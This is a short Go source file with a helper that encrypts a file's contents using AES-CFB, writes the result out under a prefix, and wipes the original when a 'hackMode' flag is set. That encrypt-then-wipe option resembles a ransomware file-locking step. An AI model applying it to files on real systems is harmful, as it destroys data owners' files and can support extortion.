package encrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"filesOperations"
	"io"
	"log"
)

func ToEncrypt(pathToFile string, key []byte, cryptoPrefix string, hackMode bool) {
	if encrypted, err := encrypt(key, filesOperations.ReadFile(pathToFile)); err != nil {
		log.Println(err)
		return
	} else {
		filesOperations.WriteFile(pathToFile, []byte(encrypted), cryptoPrefix)
	}

	if hackMode {
		filesOperations.Clear(pathToFile)
	}
}
func encrypt(key []byte, message string) (encmess string, err error) {
	plainText := []byte(message)

	block, err := aes.NewCipher(key)

	if err != nil {
		return
	}

	cipherText := make([]byte, aes.BlockSize+len(plainText))
	iv := cipherText[:aes.BlockSize]

	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
		return
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)

	encmess = base64.URLEncoding.EncodeToString(cipherText)
	return
}
